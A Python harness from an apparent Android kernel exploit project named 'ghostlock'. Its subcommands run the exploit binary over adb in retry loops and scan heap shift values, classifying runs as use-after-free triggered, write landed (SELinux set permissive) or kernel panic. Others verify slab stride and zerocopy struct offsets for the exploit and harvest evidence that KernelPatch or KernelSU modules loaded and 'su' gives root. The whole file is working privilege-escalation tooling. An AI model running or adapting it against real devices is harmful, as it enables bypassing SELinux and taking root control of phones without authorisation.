"""离线与探索工具（原 6 个 shell 脚本的 Python 版）。

preflight  符号预检：用 llvm-nm 列 .ko 的未定义符号，与设备 kallsyms 比对
harvest    命中后取证：把设备侧证据拉回本地（用 cat 而非 adb pull，后者实测会失败）
retry      重启重试循环（W1_ATTEMPTS=3）
scan       shift 扫描：逐个 SHIFT 跑单次 W1，按输出分类（fired / landed / panic）
stride     mm_struct stride 核对：slabinfo objsize vs offsets.h 里的 .mm_struct_sz
check      仓库与环境自检：py_compile + deps + 构建（零警告）+ 产物 md5 对照
"""
from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path

from . import plat
from .config import Config
from .device import Device, bad, detect_device, ok, stage, warn

GREEN, RED, YELLOW, DIM, RESET = "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[0m"


def _dev(cfg: Config) -> Device | None:
    serial = detect_device(cfg.get("_ADB"))
    if not serial:
        bad("未找到 adb 设备（设置 GHOSTLOCK_DEV=<序列号>，多设备时必须显式指定）")
        return None
    return Device(serial, cfg.get("_ADB"))


def _say(msg: str) -> None:
    print(f"\n\033[1m== {msg}\033[0m")


def _echo_out(res: subprocess.CompletedProcess, tail: int = 0) -> str:
    text = (res.stdout or "") + (res.stderr or "")
    return "\n".join(text.splitlines()[-tail:]) if tail else text


# ---------------------------------------------------------------- preflight
KO_CANDIDATES = [
    "android12-5.10_kernelpatch.ko",
    "apatch_builtin.ko/android12-5.10_kernelpatch.ko",
    "android12-5.10_kernelsu.ko",
]


def cmd_preflight(cfg: Config) -> int:
    """符号预检：.ko 的未定义符号必须都能在设备 kallsyms 里找到，否则加载必失败。
    设备符号表来自 tools/harness/dev_kallsyms.txt（在已 root 的设备上 `cat /proc/kallsyms` 导出）。"""
    nm = None
    bindir = plat.ndk_prebuilt_bin(cfg.ndk_root())
    if bindir:
        for name in ("llvm-nm", "llvm-nm.exe"):
            if (bindir / name).exists():
                nm = bindir / name
                break
    if not nm:
        bad("找不到 llvm-nm：设 ANDROID_NDK_HOME（或 ANDROID_HOME 指向 SDK root）")
        return 3

    syms_file = cfg.repo / "tools" / "harness" / "dev_kallsyms.txt"
    if not syms_file.is_file():
        bad(f"缺少设备符号表 {syms_file}")
        print("     生成：在已 root 的设备上执行 `cat /proc/kallsyms > tools/harness/dev_kallsyms.txt`")
        return 3

    dev_syms = set()
    for line in syms_file.read_text(encoding="utf-8", errors="replace").splitlines():
        parts = line.split()
        if len(parts) >= 2:
            dev_syms.add(parts[1])
    print(f"设备 kallsyms 符号数：{len(dev_syms)}")

    fails = 0
    for rel in KO_CANDIDATES:
        ko = cfg.deps_dir / rel
        if not ko.is_file():
            warn(f"跳过（不存在）{rel}")
            continue
        _say(f"{rel}  ({plat.file_size(ko)} 字节)")
        res = plat.run([plat.as_arg(nm), "-u", plat.as_arg(ko)], timeout=120)
        undefined = {ln.split()[-1] for ln in (res.stdout or "").splitlines() if ln.strip()}
        missing = sorted(undefined - dev_syms)
        print(f"  未定义符号: {len(undefined)}")
        print(f"  设备里没有: {len(missing)}")
        if missing:
            fails += 1
            for s in missing[:40]:
                print(f"    MISSING: {s}")
    return fails


# ---------------------------------------------------------------- harvest
EVIDENCE = [
    ("/sdcard/ghostlock_klog", "klog_sdcard.txt"),
    ("/data/local/tmp/.ghostlock_klog", "klog_tmp.txt"),
    ("/data/local/tmp/.ghostlock_result", "result.txt"),
    ("/data/local/tmp/.ghostlock_ksu.log", "ksu_tmp.log"),
    ("/data/local/tmp/.ghostlock_dmesg2.log", "dmesg2.log"),
    ("/data/local/tmp/.ghostlock_dmesg.log", "dmesg1.log"),
    ("/data/local/tmp/.ghostlock_pstore.log", "pstore.log"),
    ("/sdcard/ghostlock_ksu.log", "ksu_sdcard.log"),
    ("/sdcard/ghostlock_dmesg.log", "dmesg_sdcard.log"),
]


def _read_device_file(dev: Device, src: str, dst: Path) -> bool:
    """用 `cat` 读设备文件落盘。不用 `adb pull` —— 实测对 /sdcard 会失败。"""
    content = dev.shell(f"cat {src} 2>/dev/null", timeout=40)
    if not content:
        return False
    dst.write_text(content + "\n", encoding="utf-8", errors="replace")
    return True


def cmd_harvest(cfg: Config, tag: str = "hit") -> int:
    dev = _dev(cfg)
    if not dev:
        return 3
    out = cfg.log_dir / f"harvest_{tag}"
    out.mkdir(parents=True, exist_ok=True)

    _say("先等设备可用；一旦可用立刻测 su（模块可能随时消失）")
    for i in range(1, 41):
        if dev.shell("echo ok", timeout=8) == "ok":
            print(f"  device reachable (try {i})")
            print("--- 立即：/proc/modules ---")
            print("  " + dev.shell("grep -E 'kernelpatch|kernelsu' /proc/modules 2>/dev/null || echo '(no module)'"))
            print("--- 立即：su ---")
            print("  " + dev.shell("su -c id 2>&1 | head -3", timeout=20))
            break
        time.sleep(5)
    time.sleep(3)

    _say("设备侧状态")
    print(dev.shell("cat /proc/uptime; uname -r; echo '--- modules ---'; grep -E 'kernelpatch|kernelsu' /proc/modules || echo '(no module)'"))

    _say("拉取证据")
    got: list[str] = []
    for src, name in EVIDENCE:
        if _read_device_file(dev, src, out / name):
            size = plat.file_size(out / name)
            print(f"  OK   {src} -> {name} ({size} B)")
            got.append(name)
        else:
            print(f"  MISS {src}")

    _say("模块重定位的关键判据（klog）")
    klog = out / "klog_sdcard.txt"
    if not klog.is_file():
        klog = out / "klog_tmp.txt"
    if klog.is_file():
        print(klog.read_text(encoding="utf-8", errors="replace"))
    else:
        print("  (没有 klog —— exploit 进程没走到 SELF-W2 加载那步)")

    _say("su 是否可用（kpatch 装好后应立即可用）")
    print("  " + dev.shell("su -c id 2>&1 | head -2", timeout=20))

    _say("模块加载判据（dmesg2）")
    dmesg2 = out / "dmesg2.log"
    if dmesg2.is_file():
        pat = re.compile(r"kernelpatch|kernelsu|Unknown symbol|vermagic|should be|supercall|su allowlist|sucompat|init_module")
        hits = [ln for ln in dmesg2.read_text(encoding="utf-8", errors="replace").splitlines() if pat.search(ln)]
        print("\n".join(hits[-30:]) or "  (无匹配行)")
    else:
        print("  (没有 dmesg2 —— root script 没跑到加载那步，或日志写失败)")

    _say("root script 的加载结果（ksu log）")
    ksu = out / "ksu_tmp.log"
    if ksu.is_file():
        pat = re.compile(r"mode=apd-insmod|apd insmod rc|raw insmod rc|post-load dmesg|panic_on_oops|panic_on_rcu_stall|module loaded|fixup|uid=")
        hits = [ln for ln in ksu.read_text(encoding="utf-8", errors="replace").splitlines() if pat.search(ln)]
        print("\n".join(hits[-25:]) or "  (无匹配行)")

    print(f"\n全部证据在 {out}/（{len(got)} 个文件）")
    return 0


# ---------------------------------------------------------------- retry
def cmd_retry(cfg: Config, rounds: int = 8) -> int:
    """重启重试循环：等启动 → 推送校验 → 跑（W1_ATTEMPTS=3）→ 判命中。"""
    dev = _dev(cfg)
    if not dev:
        return 3
    if cfg.dry_run:
        print(f"DRY-RUN: 将跑 {rounds} 轮，每轮 stage + `cd {cfg.d_tmp} && GHOSTLOCK_W1_ATTEMPTS=3 ./ghostlock`")
        return 0
    for r in range(1, rounds + 1):
        print(f"=== round {r} start {time.strftime('%H:%M:%S')} ===")
        if not stage(dev, cfg, log=lambda m: print("  " + m)):
            print("  stage 未通过，跳过本轮")
            continue
        log = cfg.log_dir / f"gl_retry_r{r}.log"
        res = dev.adb("shell", f"cd {cfg.d_tmp} && GHOSTLOCK_W1_ATTEMPTS=3 ./ghostlock", timeout=220)
        log.write_text((res.stdout or "") + (res.stderr or "") + f"\nADB_EXIT={res.returncode}\n", encoding="utf-8")
        text = log.read_text(encoding="utf-8", errors="replace")
        if "child is root!" in text:
            print(f"=== SUCCESS at round {r} ===")
            time.sleep(8)
            print(dev.shell("grep -E 'kernelsu|kernelpatch' /proc/modules; ls /data/adb/ap/ 2>/dev/null; "
                            f"cat {cfg.d_tmp}/.ghostlock_ksu.log 2>/dev/null | tail -15"))
            return 0
        print("  " + "\n  ".join(text.splitlines()[-2:]))
        time.sleep(5)
    print(f"=== retry loop done（{rounds} 轮未命中）{time.strftime('%H:%M:%S')} ===")
    return 2


# ---------------------------------------------------------------- shift scan
SCAN_SHIFTS = [-4, -3, 1, 2, 3, 4]


def cmd_scan(cfg: Config, shifts: list[int] | None = None) -> int:
    """逐个 SHIFT 跑一次 W1，按输出分类：
    `post-select … ret=N`(N>0)=UAF 已触发；`SELinux permissive`=写成功；设备 DOWN=panic。"""
    dev = _dev(cfg)
    if not dev:
        return 3
    shifts = shifts or SCAN_SHIFTS
    if cfg.dry_run:
        print(f"DRY-RUN: 将扫描 SHIFT={shifts}，每个值一轮（GHOSTLOCK_W1_ATTEMPTS=1）")
        return 0
    for s in shifts:
        print(f"=== shift {s} start {time.strftime('%H:%M:%S')} ===")
        if not stage(dev, cfg, log=lambda m: print("  " + m)):
            print("  stage 未通过，跳过")
            continue
        log = cfg.log_dir / f"gl_scan_{s}.log"
        res = dev.adb("shell", f"cd {cfg.d_tmp} && GHOSTLOCK_SHIFT={s} GHOSTLOCK_W1_ATTEMPTS=1 ./ghostlock", timeout=120)
        log.write_text((res.stdout or "") + (res.stderr or "") + f"\nADB_EXIT={res.returncode}\n", encoding="utf-8")
        text = log.read_text(encoding="utf-8", errors="replace")
        m = re.findall(r"post-select compact=1 \+\d+ms ret=\d+", text)
        uptime = dev.shell("cat /proc/uptime").split(" ")[0] if dev.shell("cat /proc/uptime") else ""
        permissive = len(re.findall(r"SELinux permissive", text))
        print(f"shift {s}: {(m[-1] if m else 'no-post-select')} uptime={uptime or 'DOWN'} permissive={permissive}")
        if permissive >= 1:
            print(f"=== SHIFT {s} LANDED THE WRITE ===")
            full = cfg.log_dir / f"gl_scan_{s}_full.log"
            res2 = dev.adb("shell", f"cd {cfg.d_tmp} && GHOSTLOCK_SHIFT={s} ./ghostlock", timeout=220)
            full.write_text((res2.stdout or "") + (res2.stderr or "") + f"\nADB_EXIT={res2.returncode}\n", encoding="utf-8")
            print(f"  继续跑到 W2：{full}")
            return 0
        time.sleep(3)
    print(f"=== shift scan done {time.strftime('%H:%M:%S')} ===")
    return 2


# ---------------------------------------------------------------- stride
def cmd_stride(cfg: Config, expect: str | None = None) -> int:
    """用设备事实（slabinfo objsize）核对 offsets.h 里的 .mm_struct_sz。
    BTF 报的是 struct 大小、SLUB 用的是 objsize，两者不一致，必须实测。"""
    dev = _dev(cfg)
    if not dev:
        return 1
    line = dev.shell_su("grep -m1 ^mm_struct /proc/slabinfo", timeout=30)
    if not line:
        bad("拿不到 slabinfo（需要 root）")
        return 1
    fields = line.split()
    if len(fields) < 4 or not fields[3].isdigit():
        bad(f"无法解析 slabinfo: {line}")
        return 1
    objsize = int(fields[3])
    _say("slabinfo 事实")
    print(f"  · {line}")
    print(f"  · objsize（SLUB stride）= {objsize} = 0x{objsize:X}")

    release = dev.shell("uname -r")
    block = ""
    for major, name in (("5.10", "STRUCT_OFFSETS_5_10"), ("6.1", "STRUCT_OFFSETS_6_1"),
                        ("6.6", "STRUCT_OFFSETS_6_6"), ("6.12", "STRUCT_OFFSETS_6_12")):
        if release.startswith(major):
            block = name
            break
    print(f"  · 设备内核 {release} → 代码块 {block or '（无对应块）'}")

    code_val = expect or ""
    if not code_val and block:
        text = (cfg.repo / "src" / "kernels" / "offsets.h").read_text(encoding="utf-8", errors="replace")
        m = re.search(rf"#define {block}\b(.*?)(?=#define STRUCT_OFFSETS_|\Z)", text, re.S)
        if m:
            mm = re.search(r"\.mm_struct_sz\s*=\s*(0[xX][0-9a-fA-F]+)", m.group(1))
            if mm:
                code_val = mm.group(1)
                print(f"  · offsets.h 的 {block} 中 mm_struct_sz = {code_val}")
    if not code_val:
        bad("找不到代码里的 mm_struct_sz，且未指定期望值")
        return 2

    a, b = int(code_val, 0), objsize
    _say("比对")
    if a == b:
        ok(f"一致：{code_val} == {objsize}")
        return 0
    bad(f"不一致：代码 {code_val} ({a})  vs  slabinfo {objsize} ({b})")
    print("\n  说明：BTF 的 struct 大小不能当 stride 用（5.10 上是 0x3e0），要以 slabinfo 的 objsize 为准；")
    print("        修正 src/kernels/offsets.h 的 .mm_struct_sz，并在注释里附上 slabinfo 原始行作为证据。")
    return 3


# ---------------------------------------------------------------- self check
def cmd_check(cfg: Config, do_build: bool = False) -> int:
    """仓库与环境自检：Python 语法、依赖、配置、构建产物与已验证 md5 对照。"""
    fails = 0
    _say("1. Python 语法（harness 全部模块）")
    files = sorted((cfg.repo / "tools" / "harness").rglob("*.py"))
    res = plat.run([cfg.get("_PYTHON"), "-m", "py_compile", *[plat.as_arg(f) for f in files]], timeout=120)
    if res.returncode == 0:
        ok(f"{len(files)} 个模块编译通过")
    else:
        bad("py_compile 失败")
        print(_echo_out(res, tail=8))
        fails += 1

    _say("2. 依赖自足性")
    from .flow import cmd_deps
    dep_fails = cmd_deps(cfg)
    fails += dep_fails

    _say("3. 构建产物与已验证基线")
    pin = ""
    try:
        m = re.search(r"^#\s*build-pin:.*ghostlock=([0-9a-f]{32})", cfg.manifest_path.read_text(encoding="utf-8"), re.M)
        pin = m.group(1) if m else ""
    except OSError:
        pass
    if cfg.bin_path.is_file():
        got = plat.md5_of(cfg.bin_path)
        if pin and got != pin:
            warn(f"md5 {got} ≠ 已验证 {pin}（NDK 版本或源码已变——需重跑真机复验）")
        elif pin:
            ok(f"md5 与已验证基线一致（{pin[:12]}…）")
        else:
            ok(f"md5 {got[:12]}…（未声明基线）")
    else:
        bad(f"产物不存在：{cfg.bin_path}（构建：make ghostlock）")
        fails += 1

    _say("4. 构建（可选，--build 触发）")
    if do_build:
        # 用 tools/build.py 编译（不需要 GNU make —— 换机后不一定装），并顺带与 build-pin 对照
        res = plat.run([cfg.get("_PYTHON"), plat.as_arg(cfg.repo / "tools" / "build.py"), "--md5"], timeout=900)
        out_text = _echo_out(res)
        warns = len(re.findall(r"warning:", out_text))
        if res.returncode == 0 and warns == 0:
            ok("构建通过、零警告")
            print("  " + "\n  ".join(out_text.strip().splitlines()[-3:]))
        else:
            bad(f"构建 rc={res.returncode}，警告 {warns} 条")
            print("\n".join(out_text.splitlines()[-12:]))
            fails += 1
    else:
        print("  （跳过；加 --build 可顺带编译并检查零警告）")

    _say("结果")
    print("  全部通过。" if fails == 0 else f"  {fails} 项未通过。")
    return fails


# ---------------------------------------------------------------- probe（TCP 路由探测）
def cmd_probe(cfg: Config, api: int = 35) -> int:
    """探测设备上 TCP zerocopy 路线是否可用（决定 exploit 走 TCP 还是 pselect）。

    原理：只做一次 getsockopt(TCP_ZEROCOPY_RECEIVE)，读内核对 optlen 的回写值——
    内核里有 `if (len > sizeof(zc)) len = sizeof(zc);` 再 put_user(len, optlen)，
    所以回写值就是内核真实的 sizeof(struct tcp_zerocopy_receive)。
    exploit 需要写到 zc 偏移 0x28/0x30（waiter->task / waiter->lock），故该值需 >= 0x38。
    注意：**不能靠编译期判断** —— 设备实测 5.10 上 NDK 头是 0x40、内核实际是 0x28。
    """
    ndk = cfg.ndk_root() or plat.find_ndk()
    clang = plat.ndk_clang(ndk, api) or plat.ndk_clang(ndk, 34)
    if not clang:
        bad(f"NDK 里找不到 aarch64 clang（NDK={ndk or '未找到'}）：设 ANDROID_NDK_HOME / ANDROID_HOME")
        return 1
    src = cfg.repo / "tools" / "probe_tcp_route.c"
    out = cfg.repo / "build" / "probe_tcp_route"
    remote = f"{cfg.d_tmp}/probe_tcp_route"
    if not src.is_file():
        bad(f"找不到源码 {src}")
        return 1

    print(f"  · clang    {Path(clang).name}")
    print(f"  · 产物     {out}")
    if cfg.dry_run:
        print("\nDRY-RUN：将执行")
        print(f"  1) {clang} -O2 -o {out} {src}")
        print(f"  2) adb push {out} → {remote} && chmod 755 && 运行，读取 optlen 回写值")
        return 0

    dev = _dev(cfg)
    if not dev:
        return 3
    out.parent.mkdir(parents=True, exist_ok=True)
    res = plat.run([plat.as_arg(clang), "-O2", "-o", plat.as_arg(out), plat.as_arg(src)], timeout=180)
    if res.returncode != 0:
        bad("编译失败")
        print(_echo_out(res, tail=10))
        return 1
    ok(f"编译完成  {out}")
    if not dev.push(out, remote, timeout=60):
        bad("推送失败")
        return 1
    dev.shell(f"chmod 755 {remote}")
    ok(f"已推送    {remote}")
    _say("探测结果")
    print(dev.shell(remote, timeout=60))
    return 0
